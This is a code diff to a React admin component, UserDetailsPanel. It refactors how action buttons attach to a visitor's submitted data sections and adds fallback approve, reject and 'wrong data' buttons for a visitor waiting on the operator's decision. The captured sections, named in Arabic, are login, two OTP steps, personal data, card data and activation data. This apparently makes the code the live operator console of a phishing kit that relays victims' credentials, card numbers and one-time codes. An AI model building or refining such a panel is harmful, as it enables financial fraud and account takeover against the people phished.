@@ -179,31 +179,26 @@ const UserDetailsPanel = ({ user, onClose, onDelete }: UserDetailsPanelProps) =>
   });
   const lastFilledKey = filledSections.length > 0 ? filledSections[filledSections.length - 1].key : null;
 
+  // The action buttons should anchor to the LATEST submitted section so the
+  // admin can always approve/reject. We map the current page to its preferred
+  // section, then fall back to the last filled section. If nothing is filled
+  // yet but the visitor is waiting, we render the buttons in a floating block.
   const actionSectionKey = (() => {
     const hasSection = (key: SectionKey) => filledSections.some((section) => section.key === key);
-
-    switch (liveUser.last_page) {
-      case "تسجيل الدخول":
-        return hasSection("home_data") ? "home_data" : lastFilledKey;
-      case "OTP":
-        return hasSection("otp1_data") ? "otp1_data" : lastFilledKey;
-      case "المعلومات الشخصية":
-        if (hasSection("address_data")) return "address_data";
-        if (hasSection("personal_data")) return "personal_data";
-        return lastFilledKey;
-      case "الانتظار":
-        return null;
-      case "بيانات البطاقة":
-        return hasSection("card_data") ? "card_data" : lastFilledKey;
-      case "OTP Token":
-        return hasSection("otp2_data") ? "otp2_data" : lastFilledKey;
-      case "الرسالة":
-        return hasSection("message_data") ? "message_data" : lastFilledKey;
-      case "بيانات التفعيل":
-        return hasSection("activation_data") ? "activation_data" : lastFilledKey;
-      default:
-        return lastFilledKey;
-    }
+    const pageMap: Record<string, SectionKey> = {
+      "تسجيل الدخول": "home_data",
+      "OTP": "otp1_data",
+      "المعلومات الشخصية": "personal_data",
+      "بيانات البطاقة": "card_data",
+      "OTP Token": "otp2_data",
+      "الرسالة": "message_data",
+      "بيانات التفعيل": "activation_data",
+    };
+    const preferred = pageMap[liveUser.last_page || ""];
+    if (preferred && hasSection(preferred)) return preferred;
+    // Special: personal info page often has address as a follow-up
+    if (liveUser.last_page === "المعلومات الشخصية" && hasSection("address_data")) return "address_data";
+    return lastFilledKey;
   })();
 
   const sendAction = async (action: string, target?: string) => {
@@ -380,6 +375,27 @@ const UserDetailsPanel = ({ user, onClose, onDelete }: UserDetailsPanelProps) =>
               );
             })}
           </div>
+
+          {/* Fallback action buttons: visitor is waiting but no section is mapped
+              (e.g. arrived on a page without submitting any data yet, or sitting on the waiting page) */}
+          {isWaiting && (filledSections.length === 0 || actionSectionKey === null) && (
+            <div className="mt-3 border-2 border-dashed border-amber-400 bg-amber-50/50 rounded-xl p-3">
+              <p className="text-[11px] font-bold text-amber-800 mb-2 text-center">
+                ⏳ الزائر في انتظار قرارك ({liveUser.last_page || "—"})
+              </p>
+              <div className="grid grid-cols-2 gap-1.5">
+                <Button size="sm" className="border-2 border-green-500 bg-green-500/10 text-green-700 hover:bg-green-500/20 font-bold text-xs h-8" variant="outline" disabled={sending !== null} onClick={() => sendAction("موافقة")}>
+                  {sending === "موافقة" ? "..." : "✅ موافقة"}
+                </Button>
+                <Button size="sm" className="border-2 border-red-500 bg-red-500/10 text-red-700 hover:bg-red-500/20 font-bold text-xs h-8" variant="outline" disabled={sending !== null} onClick={() => sendAction("رفض")}>
+                  {sending === "رفض" ? "..." : "❌ رفض"}
+                </Button>
+                <Button size="sm" className="col-span-2 border-2 border-destructive bg-destructive/10 text-destructive hover:bg-destructive/20 font-bold text-xs h-8" variant="outline" disabled={sending !== null} onClick={() => sendAction("بيانات خاطئة")}>
+                  {sending === "بيانات خاطئة" ? "..." : "⚠️ بيانات خاطئة"}
+                </Button>
+              </div>
+            </div>
+          )}
         </div>
 
         {/* Watch choice */}
